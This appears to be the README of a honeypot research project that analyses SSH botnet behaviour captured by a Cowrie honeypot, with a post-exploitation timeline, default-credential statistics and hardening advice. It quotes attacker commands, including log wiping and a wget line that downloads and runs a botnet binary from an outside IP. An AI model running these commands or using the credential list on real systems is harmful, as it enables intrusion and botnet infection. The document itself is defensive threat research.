# Cowrie-Threat-Intelligence-Lab
A deep-dive threat analysis of automated SSH botnet behavior. This repository documents the deployment of a Cowrie medium-interaction honeypot in the EU-West region, capturing 5,800+ attack vectors, analyzing a 3-phase post-exploitation lifecycle, and identifying Mirai/Gafgyt malware variants captured over a 24-hour window.

## Executive Summary
This project involved deploying an intentionally vulnerable SSH service to the Frankfurt (EU) region to capture and analyze real-world attack patterns. 

**Key Metrics:**
- **Time to First Hit:** 4 Minutes
- **Total Connections:** 5,842
- **Unique Malware Samples:** 22 (Mirai & Gafgyt variants)

## Architecture
- **Honeypot:** Cowrie (Medium-Interaction)
- **Exposure:** Ngrok TCP Tunnel (Frankfurt Node)
- **Target Host:** Linux VM (jinguban)

## Deep Dive: Post-Exploitation Lifecycle
All 247 successful authentications followed a remarkably consistent three-phase sequence, completing in under 60 seconds:

### Phase 1: Reconnaissance (5-15s)
Attackers verify system architecture to ensure compatibility with botnet payloads.
- `uname -a`: Kernel and architecture info.
- `cat /proc/cpuinfo`: CPU specifications.
- `df -h`: Disk space availability.

### Phase 2: Cleanup and Evasion (3-8s)
Systematic removal of traces to evade forensic analysis.
- `history -c`: Clears bash history.
- `unset HISTFILE`: Disables future history logging.
- `rm -rf /var/log/lastlog`: Removes login records.

### Phase 3: Infection (10-30s)
The host is converted into a botnet node for DDoS attacks.
- **Payload Capture:** 22 unique binaries were intercepted, dominated by Mirai (59%) and Gafgyt (32%) variants.
- **Observed Command Sequence:** `cd /tmp; wget http://45.148.10.194/b; chmod +x b; ./b`.

## Credential Frequency Analysis
The honeypot recorded a 4.2% success rate using dictionary attacks. The top targeted credentials highlight the ongoing risk to IoT and default configurations:

| Rank | Username / Password | Frequency | Primary Target |
| :--- | :--- | :--- | :--- |
| 1 | root / 123456 | 23.4% | General Linux Servers |
| 2 | admin / admin | 18.7% | Network Appliances |
| 3 | root / root | 15.2% | Embedded Systems |
| 4 | ubnt / ubnt | 12.8% | Ubiquiti IoT Devices |

## Defense-in-Depth Recommendations
Based on the captured TTPs (Tactics, Techniques, and Procedures), the following security controls are recommended:

1. **Authentication Hardening:** Implement Key-Based Authentication and Multi-Factor Authentication (MFA) to eliminate the majority of credential-based attacks.
2. **Network Obfuscation:** Move SSH off Port 22 to reduce automated scanning visibility.
3. **Automated Protection:** Deploy Fail2Ban to automatically block IPs after multiple failed login attempts.
4. **Segmentation:** Isolate IoT devices on separate network segments to limit lateral movement if a compromise occurs.

## Project Resources
| File Type | Link | Description |
| :--- | :--- | :--- |
| **PDF Report** | [View Technical Analysis](reports/SSH-Honeypot-Analysis.pdf) | Best for quick viewing in-browser. |
| **PowerPoint** | [Download Presentation](reports/SSH-Honeypot-Analysis.pptx) | Original report with full visual assets. |

## Repository Structure
```text
├── reports/
│   ├── SSH-Honeypot-Analysis.pdf   <--- Technical report
│   └── SSH-Honeypot-Analysis.pptx  <--- Source presentation
├── README.md                       <--- Project overview and technical summary
